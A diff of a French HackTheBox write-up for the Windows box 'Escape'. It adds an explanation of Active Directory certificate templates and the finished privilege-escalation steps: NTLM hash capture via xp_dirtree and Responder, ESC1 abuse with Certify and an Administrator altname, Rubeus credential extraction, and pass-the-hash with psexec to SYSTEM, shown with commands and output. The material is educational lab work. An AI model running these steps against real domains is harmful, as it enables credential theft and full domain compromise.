@@ -312,21 +312,26 @@
     <li><a href="#pivoting-puis-privesc">Pivoting puis privesc</a>
       <ol>
         <li><a href="#pivoting">Pivoting</a></li>
-        <li><a href="#privesc">Privesc</a></li>
-        <li><a href="#chantier">chantier</a></li>
+        <li><a href="#privesc">Privesc</a>
+          <ol>
+            <li><a href="#explication">Explication</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+          </ol>
+        </li>
       </ol>
     </li>
+    <li><a href="#conclusion">Conclusion</a></li>
   </ol>
 </nav></div>
       </details>
     
   
   <div class="content"><h2 id="introduction">Introduction</h2>
-<p>Cette box était une machine windows de niveau medium qui permettait de privec en utilisant une vulnérabilité de type <code>ESC1</code>!
-On va commencer tout de suite en lançant un scan nmap comme pour toutes les box HTB.</p>
+<p>Cette box était une machine windows de niveau medium qui faisait intervenir notamment une privesc basée sur la demande de certificat au sein de l&rsquo;Active Directory!
+On va commencer tout de suite en lançant un scan nmap comme pour toutes les boxs HTB.</p>
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="scans">Scans</h3>
-<p>Le scan présente bien toutes les caractéristiques d&rsquo;un <code>Domain Controller</code>, on y voit les ports <code>445</code> et <code>139</code> pour le smb, le port <code>88</code> pour le ``Kerberos 5 ticket service` et le service DNS habituel:</p>
+<p>Le scan présente bien toutes les caractéristiques d&rsquo;un <code>Domain Controller</code>, on y voit les ports <code>445</code> et <code>139</code> pour le smb, le port <code>88</code> pour le <code>TGS</code> et le service DNS habituel:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 04:53 EDT
 </span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.202
 </span></span><span class="line"><span class="cl">Host is up (0.028s latency).
@@ -413,7 +418,7 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 <div>
     <img src="assets/PDF_bonus.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
 </div>
-<p>A la fin de ce dernier on tombe sur des creds de la base de données, destinés au nouveaux arrivants.</p>
+<p>A la fin de ce dernier on tombe sur des creds de la base de données, destinés au nouveaux arrivants 😁, on va aller jeter un oeil là bas.</p>
 <h3 id="accès-à-la-base-de-données">Accès à la base de données</h3>
 <p>Pour se connecter à une base de données MSSQL sous linux il est possible d&rsquo;utiliser <code>sqsh</code> ou l&rsquo;utilitaire proposé par <code>Impacket</code>, ce que nous allons faire ici:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
@@ -440,7 +445,7 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">msdb
 </span></span></code></pre></div><h2 id="obtention-des-premiers-creds">Obtention des premiers creds</h2>
-<p>Ok donc il n&rsquo;y a que les bases de données par défault de MSSQL, cela ne sert à rien d&rsquo;aller chercher à l&rsquo;intérieur. Maintenant il va nous falloir d&rsquo;obtenir les creds du compte sur lequel tourne le serveur ou arriver à RCE tout de suite.</p>
+<p>Ok donc il n&rsquo;y a que les bases de données par défault de MSSQL, cela ne sert à rien d&rsquo;aller chercher à l&rsquo;intérieur. Pour obtenir un foothold sur le serveur il va soit nous falloir obtenir les creds du compte sur lequel tourne le serveur SQL, soit arriver à RCE tout de suite. C&rsquo;est sur la première option que l&rsquo;on va se concentrer pour avancer.</p>
 <h3 id="relay-attack-sur-le-compte-mssql">Relay attack sur le compte MSSQL</h3>
 <p>Malheureusement la commande <code>xp_cmdshell</code> permettant d&rsquo;exécuter des commandes n&rsquo;est pas accessible, après quelque recherches on tombe sur une méthode d&rsquo;exploitation qui permet de mettre en place une <code>Relay attack</code> à partir d&rsquo;un accès MSSQL: En utilisant la commande <code>xp_dirtree</code> qui permet d&rsquo;accéder à une resssource distante.</p>
 <p>En effet si on fait en sorte que le serveur fasse une requete SMB vers un serveur que l&rsquo;on contrôle, pour s&rsquo;authentifier il enverra son hash <code>NTLMv2</code> que nous pourrons cracker en offline. On va donc lancer notre serveur SMB avec l&rsquo;outil <code>Responder</code> sur l&rsquo;interface connectée au VPN comme ceci:</p>
@@ -480,7 +485,7 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span><span class="line"><span class="cl">Started: Thu Jun 15 11:21:42 2023
 </span></span><span class="line"><span class="cl">Stopped: Thu Jun 15 11:21:58 2023
 </span></span></code></pre></div><h2 id="obtention-du-foothold-sur-le-domain-controller">Obtention du foothold sur le Domain controller</h2>
-<p>Nickel! Maintenant il va nous falloir RCE sur le DC, on peut commencer par voir si le service <code>WinRM</code> est utilisé par le DC:</p>
+<p>Nickel! Maintenant il va nous falloir obtenir un shell sur  DC, on peut commencer par voir si le service <code>WinRM</code> est utilisé par ce dernier:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cme winrm 10.10.11.202                                                                       
 </span></span><span class="line"><span class="cl">SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
 </span></span><span class="line"><span class="cl">HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
@@ -498,7 +503,7 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; whoami
 </span></span><span class="line"><span class="cl">sequel\sql_svc
 </span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; 
-</span></span></code></pre></div><p>Et on obtient notre premier shell sur le DC en tant que <code>sql_svc</code>.</p>
+</span></span></code></pre></div><p>Et on obtient notre premier shell sur le DC en tant que <code>sql_svc</code> 👍.</p>
 <h2 id="pivoting-puis-privesc">Pivoting puis privesc</h2>
 <h3 id="pivoting">Pivoting</h3>
 <p>En fouillant à la racine du disque on trouve un dossier <code>SQLServer</code> contenant des Logs et dans l&rsquo;une d&rsquo;elle quelque chose d&rsquo;assez intéressant:</p>
@@ -513,8 +518,23 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span></code></pre></div><p>L&rsquo;utilisateur <code>Ryan.Cooper</code> a essayé de se connecter et c&rsquo;est trompé en mettant son mot de passe à la place de son nom d&rsquo;utilisateur, on va pouvoir pivoter sur son compte.</p>
 <p>Une fois connecté en tant que Ryan, on peut récupérer le premier flag sur son bureau: <code>2f60dd9b4e3e3deeec9373f3c70a1011</code>.</p>
 <h3 id="privesc">Privesc</h3>
-<p>Comme suggéré par le nom du challenge (<code>ESCcape</code>), on va s&rsquo;intéresser à cette branche là des</p>
-<h3 id="chantier">chantier</h3>
+<p>Comme suggéré par le nom du challenge (<code>ESCcape</code>), on va se pencher sur les privescs se basant sur les requêtes de certificats du <code>Certificate Service</code> de l&rsquo;Active Directory. Voilà tout d&rsquo;abord une petite explication sur le fonctionnemnet du Certificate Service:</p>
+<h4 id="explication">Explication</h4>
+<p>Le Certificate Service a pour objectif de fournir des certificats utilisés pour du chiffrement ou pour l&rsquo;authentification par exemple. Pour qu&rsquo;un utilisateur obtienne un certificat, il faut qu&rsquo;il envoie une <code>CSR</code> (Certificate Signing Request) à la <code>CA</code>. Voilà ce que cette requête va contenir:</p>
+<ul>
+<li>La clé publique que l&rsquo;utilisateur veut associer à son identité sur l&rsquo;AD.</li>
+<li>Un sujet à qui associer le certificat.</li>
+<li>Un <code>EKU</code> (Extended/Enhanced Key Usage), qui définit ce pour quoi le certificat va être utilisé.</li>
+<li>Un <code>Certificate Templates</code> qui est un ensemble de règles et de paramètres qui vont être appliqués au certificat comme sa durée de validité par exemple.</li>
+</ul>
+<p>Voilà un schéma du procédé d&rsquo;obtention du certificat:</p>
+<div>
+    <img src="assets/CSR_schema.png", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Ce qui va nous permettre d&rsquo;élever nos privilèges est une option du template appellée <code>subjectAltName</code> qui permet d&rsquo;associer d&rsquo;autres identités au certificat. J&rsquo;ai trouvé une explication à l&rsquo;existence de cette option <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">ici</a>: En fait, associer plusieurs sujets à un seul certificat peut s&rsquo;avérer utile dans le cas d&rsquo;un serveur web par exemple qui pourrait gérer plusieurs domaines avec un seul certificat SSL.</p>
+<p>Finalement pour que la privesc fonctionne, il faut que notre utilisateur ait les droits de demander un certificat, qu&rsquo;il puisse spécifier un <code>EKU</code> lui permettant de s&rsquo;authentifier avec son certificat, et il faut que l&rsquo;option subjectAltName soit disponible. Par chance ces trois contraintes étaient remplies sur cette box.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>Pour pouvoir demander un certificat à la CA de l&rsquo;AD, il faut importer le binaire <code>certify.exe</code> sur la machine ce que nous pouvons faire avec evil-winrm comme ceci:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Ryan.Cooper&gt; upload Certify.exe
 </span></span><span class="line"><span class="cl">Info: Uploading Certify.exe to C:\Users\Ryan.Cooper\Certify.exe
 </span></span><span class="line"><span class="cl">
@@ -522,7 +542,8 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span><span class="line"><span class="cl">Data: 232104 bytes of 232104 bytes copied
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Info: Upload successful!
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
+</span></span></code></pre></div><p>Maintenant on peut demander un certificat en spécifiant le template <code>UserAuthentication</code> qui spécifie que l&rsquo;on pourra utiliser ce certificat pour s&rsquo;identifier et avec l&rsquo;option <code>/altname</code> qui spécifie le second utilisateur à associer à notre certificat, pour une privesc on met donc l&rsquo;administrateur local du DC.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">   _____          _   _  __
 </span></span><span class="line"><span class="cl">  / ____|        | | (_)/ _|
@@ -619,8 +640,10 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Certify completed in 00:00:12.9065614
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">openssl pkcs12 -in certif.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
+</span></span></code></pre></div><p>Comme suggéré par le programme, il nous faut maintenant convertir ce certificat du format <code>PEM</code> au format <code>PFX</code> pour pouvoir ensuite l&rsquo;utiliser pour s&rsquo;identifier auprès du TGS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">openssl pkcs12 -in certif.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
+</span></span></code></pre></div><p>Maintenant on upload notre certificat fraichement créé ainsi que le binaire de Rubeus, on spécifie l&rsquo;option <code>/getcredentials</code> pour récupérer un <code>NTHash</code> de l&rsquo;administrateur:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">   ______        _
 </span></span><span class="line"><span class="cl">  (_____ \      | |
@@ -635,51 +658,94 @@ On va commencer tout de suite en lançant un scan nmap comme pour toutes les box
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
 </span></span><span class="line"><span class="cl">[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;sequel.htb\Administrator&#39;
-</span></span><span class="line"><span class="cl">[*] Using domain controller: fe80::4cb0:8b67:3bf3:1420%4:88
+</span></span><span class="line"><span class="cl">[*] Using domain controller: fe80::59de:dd89:1ace:5e71%4:88
 </span></span><span class="line"><span class="cl">[+] TGT request successful!
 </span></span><span class="line"><span class="cl">[*] base64(ticket.kirbi):
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
-</span></span><span class="line"><span class="cl">      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBDfgOUYGIS2X
-</span></span><span class="line"><span class="cl">      c5xYwUqn/MyOAu9WBp0jo+czd8KgYvAM/Jy+Hv79oSQAAWubl83tiV7GA9BFYJDW4hTZDiTLol3nRHnT
-</span></span><span class="line"><span class="cl">      dZ5Mkandxk3zsy5tNweoAeasM6mHjuuzXortlr2jaHWEwYOocH2ZTrMOAZxZ+tpWCc0h9/ZiNq0RF8N2
-</span></span><span class="line"><span class="cl">      pM5VELvawn66iLxbN3kuz5ZEHWoZWauGkMOZNrzihKoE1spkAqC88MkbC2k5JGlHwSmUBVbeEV8pl38+
-</span></span><span class="line"><span class="cl">      +Vl3kRqN+BomxGYY0zHgnE+QqQpN68WjjMIhUuMpxMYcSBR4V2SX3jk5muJGtFqp3Vz8IQkTWm6A0+s0
-</span></span><span class="line"><span class="cl">      ejP6bRUkiiv+bUwX/E+0Bmbx31oiBdzlqz2BFlhCFU676UWP/Llxvs6MJyrTZtn3feHqDhc0YzeqKtrU
-</span></span><span class="line"><span class="cl">      eJFtNmHhXA+xOQp5GX4yOA/nJO0yBYdVyVcagHldW89mstpyJ9I5dOrpVFt+wCp4qQlX0U589JyCrXAF
-</span></span><span class="line"><span class="cl">      V3nseWJbvHq8Q8J5D1dmvGWP9KGUwBqbkhdMzQnrCzmMFF2bMcHCj9kG69v/JCmyOzfO2Jw/clMZ6SmX
-</span></span><span class="line"><span class="cl">      cETwsGI8bVMEOIOz8yCbrHsGyyTKQVLYOiQvyTXf7+vMXmmzgJKMIVW5Xpl4iBAFK0dCNBf+jCKs0rjH
-</span></span><span class="line"><span class="cl">      gnsoeBWB2SX2d6dFuiNO8rwjDbl2vZItNLN+gQxzeDkLGPqTbOwgKKvQV7M/0bdxdsojRuAQWTTD/h+d
-</span></span><span class="line"><span class="cl">      8wI4dhwHvg8Kvp8lT/cbhgebSVqMXMK9P6jLob27wkhseT9aMhYgeJVzir4WetvvdRJdGbdblF6cRGgH
-</span></span><span class="line"><span class="cl">      3DX3lq9w1dC1e0/n9cWrQOQxXZNgjsLPSGdWU4XOaGLk0vWHr72bokHuSx6fj5qIHyadc/BWVUT6m7an
-</span></span><span class="line"><span class="cl">      pQfLUeEDPUUeBw83XLEblfmdKMBltgaOoepbip7421QQe7A9VxaxlXUPXJLf8vy3MIUYfRwIoFVx9X6a
-</span></span><span class="line"><span class="cl">      bNUMhKRjp8Fv97pA86M5YqJWlRPQMhZP1QSxlURg/CAKPLG9ZYQbAvVtXECVaP0G7TFnF4J6jqOBH407
-</span></span><span class="line"><span class="cl">      PvKqNsHhTGutjlXYucpzLKrbrprtc9RCDdteqJKbDlOcwahZRPylXMmJWyn++K7CC+N1Q49QSrpsmlAj
-</span></span><span class="line"><span class="cl">      xAS+ZR2pmTS/M6912kjIrCGzLB3nHSQL3+ZTTD/oNPjHEMrHz13GivIQTrA0d8Y7o/71bks+kZEKSWMJ
-</span></span><span class="line"><span class="cl">      nxBgZ/x2GDGRrAK8chfiscXPdA6rAsxp1dWYvUyIg4409iiCt3wq6TmvrWtvHVLFVWclXNuKrjNjQzpd
-</span></span><span class="line"><span class="cl">      K5KkDWwYR6s6giONSSk+1jp2CqwCpaI5T8zqZlCASk7/1de2YsrhQTHgLMoubrJT9hQU3QDJvGXMJG0o
-</span></span><span class="line"><span class="cl">      rd6uGH2kCM7bx56lF8AAcDuCejB8Ua9IWjxtEVzdqZ0XWinrfC0joV7z9lHo2GiExCYCgZvTdD0uOa5E
-</span></span><span class="line"><span class="cl">      m19mC+8VnDpOL4nhRh4Oi6enQN3cporZ/jI4klyJNZO5BEgGVQkvrY1GYmKF5T+Bj7wh6XFfLtWGq000
-</span></span><span class="line"><span class="cl">      BhfeixwnyQNBOxce/U9pWQNh3u94Ke1q1j1hc5cKp1pkM0tk6Ol0S/fc1FzIuBTdw9wfBzNOXEwj8t2P
-</span></span><span class="line"><span class="cl">      wdTkS5iq6jcsHJegErKCVaholQwYJGyLqpFkmBaXYZvWLKtQs72QYD4AEo7w3NSEynU+LxdGxWa7inEo
-</span></span><span class="line"><span class="cl">      uC+YFVoPVOSZAc/efFyyRKOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
-</span></span><span class="line"><span class="cl">      EOvVmJIsSJi03aiT9NnsTvqhDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
-</span></span><span class="line"><span class="cl">      BwMFAADhAAClERgPMjAyMzA2MTYwMDQxNDlaphEYDzIwMjMwNjE2MTA0MTQ5WqcRGA8yMDIzMDYyMzAw
-</span></span><span class="line"><span class="cl">      NDE0OVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==
-</span></span><span class="line"><span class="cl">[+] Ticket successfully imported!
+</span></span><span class="line"><span class="cl">      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBHcmXzLP3LE6
+</span></span><span class="line"><span class="cl">      hn0ONcorr9bV+SMnbtF+handfptlfctMu7g2cmQkY1dnDO9U91rw2cJZbeQomV50b7zyUjBDrolD0bKV
+</span></span><span class="line"><span class="cl">      WcLDuMll/yfqmukYP0eKaAzLtfMPwhRu1rS5r6XB7ySTzcfURHyOVq45vZnQv/J9dkAfrnjhlTHdCV2M
+</span></span><span class="line"><span class="cl">      LWlr/aJn1cujqCgzBwspgdW3WToJZj51dMT5gb7mIvz8tI++a0LH+D+oUKbcMEvEU6c2+eeVyyGgdQGL
+</span></span><span class="line"><span class="cl">      C5DijtJsNAbmY80Rt0QtlPB72zRAp1j14Im5X2PERsYEkSbTcENdAo+2zi/uYqCk2Mi27HNWp3erOqw1
+</span></span><span class="line"><span class="cl">      Yx849qCR+YWrdJi3O9cD8iLjh9PVnIzTHmT5ipGqOBY+8KmWDOgJ5ovJL9Qz694DSA7/te1bLrwqnLt5
+</span></span><span class="line"><span class="cl">      9hH4NSnoLAj4gL9Y6jbCVWW3z7oecSSZtutDIj0TXA1AxabSSDzDqlle5XRgLw9pWRxofbBXgUthDX2G
+</span></span><span class="line"><span class="cl">      TAWNsqZA1Vl98hCtxTO3cOAZlSY/F7c7GqMT0XtB5xo4t6NPdtOoOlm2maarLC7cVe2tx+IIYmqSHP9u
+</span></span><span class="line"><span class="cl">      ZN6ZpxoH+pkx4pwNWU/FzyHg4jTW6cLK3MFYZeSF8nCg1nRfWe3u+1gCP/2SPsSrh1a5eiybf0WAoCLN
+</span></span><span class="line"><span class="cl">      m0j3+jPagLSPgdPJr4VMrFWIT8hOae3nVAf4Y0lKe7SCL+e+hBwChsaWqtLLx8h3Ogl4xjT1nl0+O5cQ
+</span></span><span class="line"><span class="cl">      e1laYBdslv5HwOZe5wDPkD+s5wp4FN/GNEZvwM4s19aLk27epRVKjk8Xj/aChiM9fOXmbwhSBtMgPhkS
+</span></span><span class="line"><span class="cl">      k5pi04+3yINhyw05jdf4kXgTlbmtgqm25S0maclDPeHDCVQ/svtVoCN6Wea+6HKlH5D/jLihFtk22d4v
+</span></span><span class="line"><span class="cl">      UtWSDuZRQ/0kvWgcp3XbArgCdnWwuHGZhBp1fq2evk+/S/k+Va4qRbXt+WiWyCN0UNxMs8JgB5GfhjxE
+</span></span><span class="line"><span class="cl">      sZ+xzx5otYmVb3v6atYcxYRqt+kzHzs3zRczLFO7J9Gl+4w4lVXvKdSooSfJhMb1cy0SKfI2kgRvwBeu
+</span></span><span class="line"><span class="cl">      CiZtlwToIPae1anKSvL/QSssWD67BVQGsVVHYxHIhmn9XrSsZ4shwwuzV4RUMFia7q4HedRY/0z5jT7O
+</span></span><span class="line"><span class="cl">      gLR4eKt8QCo9x5JMgbb9pU5topmNr+yQk0cF5OfzwFAr1j4X7mEmA01b7sNvWL0h7TNATOhFsQU8QLwg
+</span></span><span class="line"><span class="cl">      INUOeR87mWaSQ5+ajQy5vYmAcx3BncRjXxC6iKr1LdrkdK4F84qG1vizPTBmZoctzCJQxGDs9TZXIPx5
+</span></span><span class="line"><span class="cl">      Ee0UadhDIQ/X8q9DqVYItrNTl+EUBjKBiLXeraRaf999AbLzt9kWmQdYoXI85h0h7FDKfjMQYjFwBy8S
+</span></span><span class="line"><span class="cl">      29xeD1LBPV0P1cxvOxq0lvKaNeUMZmYw1KtDWLjA2pOtOA+Zv4aIiE68tLuQs/MLRJPufLlJuFK5yXF0
+</span></span><span class="line"><span class="cl">      q/Fn0ZLLYdv3fPPwtw8H6nbou3Qbq65f6twbscxRzx3ifAMs3uZ7xkgY1QKhlrbc+sIHIVfZIXLbcQgD
+</span></span><span class="line"><span class="cl">      Vc6Yds+kwxenuw12ZpxkkUySrPE8XoNepiih3fCDBt27ji3U3rjk0HdPgAq/p4yc9AmRYUn/0sgixT97
+</span></span><span class="line"><span class="cl">      wWBeopKUJy90EHpNgZWoH+mx5ln6ZSZCpd2r9Pz45we5mJrNAu39sYg2JiM73KAag+bMwHtUvCMPoWls
+</span></span><span class="line"><span class="cl">      v9CYedOaUB4k1NBWNwMyDqOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
+</span></span><span class="line"><span class="cl">      ELkSQ3sYvj5YxfgKPWgt9x+hDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
+</span></span><span class="line"><span class="cl">      BwMFAADhAAClERgPMjAyMzA2MTcwNDA4NDFaphEYDzIwMjMwNjE3MTQwODQxWqcRGA8yMDIzMDYyNDA0
+</span></span><span class="line"><span class="cl">      MDg0MVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  ServiceName              :  krbtgt/sequel.htb
 </span></span><span class="line"><span class="cl">  ServiceRealm             :  SEQUEL.HTB
 </span></span><span class="line"><span class="cl">  UserName                 :  Administrator
 </span></span><span class="line"><span class="cl">  UserRealm                :  SEQUEL.HTB
-</span></span><span class="line"><span class="cl">  StartTime                :  6/15/2023 5:41:49 PM
-</span></span><span class="line"><span class="cl">  EndTime                  :  6/16/2023 3:41:49 AM
-</span></span><span class="line"><span class="cl">  RenewTill                :  6/22/2023 5:41:49 PM
+</span></span><span class="line"><span class="cl">  StartTime                :  6/16/2023 9:08:41 PM
+</span></span><span class="line"><span class="cl">  EndTime                  :  6/17/2023 7:08:41 AM
+</span></span><span class="line"><span class="cl">  RenewTill                :  6/23/2023 9:08:41 PM
 </span></span><span class="line"><span class="cl">  Flags                    :  name_canonicalize, pre_authent, initial, renewable
 </span></span><span class="line"><span class="cl">  KeyType                  :  rc4_hmac
-</span></span><span class="line"><span class="cl">  Base64(key)              :  69WYkixImLTdqJP02exO+g==
-</span></span><span class="line"><span class="cl">  ASREP (key)              :  CB53D6F86965C2B946E20CF15B91858E
-</span></span></code></pre></div></div>
+</span></span><span class="line"><span class="cl">  Base64(key)              :  uRJDexi+PljF+Ao9aC33Hw==
+</span></span><span class="line"><span class="cl">  ASREP (key)              :  AE715F3B89BFC48C00CCF0A427E72CD4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Getting credentials using U2U
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  CredentialInfo         :
+</span></span><span class="line"><span class="cl">    Version              : 0
+</span></span><span class="line"><span class="cl">    EncryptionType       : rc4_hmac
+</span></span><span class="line"><span class="cl">    CredentialData       :
+</span></span><span class="line"><span class="cl">      CredentialCount    : 1
+</span></span><span class="line"><span class="cl">       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+</span></span></code></pre></div><p>Finalement il ne nous reste plus qu&rsquo;à Pass The Hash avec le hash que l&rsquo;on vient d&rsquo;obtenir et récupérer le flag root:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">python3 /usr/share/doc/python3-impacket/examples/psexec.py sequel.htb/Administrator@10.10.11.202 -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Requesting shares on 10.10.11.202.....
+</span></span><span class="line"><span class="cl">[*] Found writable share ADMIN$
+</span></span><span class="line"><span class="cl">[*] Uploading file AwSRfBfO.exe
+</span></span><span class="line"><span class="cl">[*] Opening SVCManager on 10.10.11.202.....
+</span></span><span class="line"><span class="cl">[*] Creating service PNtf on 10.10.11.202.....
+</span></span><span class="line"><span class="cl">[*] Starting service PNtf.....
+</span></span><span class="line"><span class="cl">[!] Press help for extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.2746]
+</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Windows\system32&gt; whoami
+</span></span><span class="line"><span class="cl">nt authority\system
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt; dir
+</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
+</span></span><span class="line"><span class="cl"> Volume Serial Number is EB33-4140
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Directory of C:\Users\Administrator\Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">02/06/2023  04:43 PM    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">02/06/2023  04:43 PM    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">06/16/2023  05:47 AM                34 root.txt
+</span></span><span class="line"><span class="cl">               1 File(s)             34 bytes
+</span></span><span class="line"><span class="cl">               2 Dir(s)   5,943,947,264 bytes free
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt; type root.txt
+</span></span><span class="line"><span class="cl">e93fbe617988de512fcf81df9bdcd841
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt;
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Cette box était une de mes premières box windows sur HackTheBox et je l&rsquo;ai trouvée très intéressante pour comprendre les méthodes d&rsquo;exploitations relatives aux requêtes de certificats sur un active directory 😀.</p>
+</div>
   
     <div class="mt-16">
 
